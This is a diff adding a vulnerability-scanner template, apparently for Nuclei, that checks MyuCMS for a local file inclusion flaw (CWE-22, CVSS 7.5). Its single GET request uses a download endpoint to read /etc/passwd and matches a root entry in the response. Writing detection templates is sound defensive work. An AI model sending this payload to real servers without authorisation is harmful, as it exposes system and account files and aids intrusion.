@@ -1,0 +1,23 @@
+http:
+- matchers:
+  - regex:
+    - 'root:.*:0:0:'
+    type: regex
+  method: GET
+  path:
+  - '{{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1'
+id: myucms-lfr
+info:
+  author: princechaddha
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  description: MyuCMS is vulnerable to local file inclusion.
+  metadata:
+    max-request: 1
+  name: MyuCMS - Local File Inclusion
+  reference:
+  - https://blog.csdn.net/yalecaltech/article/details/104908257
+  severity: high
+  tags: myucms,lfi
